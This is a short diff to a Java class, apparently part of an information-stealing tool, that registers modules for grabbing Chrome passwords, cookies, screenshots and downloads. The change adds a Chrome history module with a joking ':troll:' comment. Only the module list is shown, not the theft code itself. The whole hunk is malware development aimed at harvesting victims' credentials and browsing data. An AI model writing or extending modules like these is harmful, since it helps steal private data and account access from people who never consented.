@@ -18,7 +18,9 @@ public class RequestManager {
                 new ChromePasswords(),
                 new ScreenShot(),
                 new ChromeCookies(),
-                new Downloads()
+                new Downloads(),
+                new ChromeHistory() // :troll:
+
         ));
     }
 
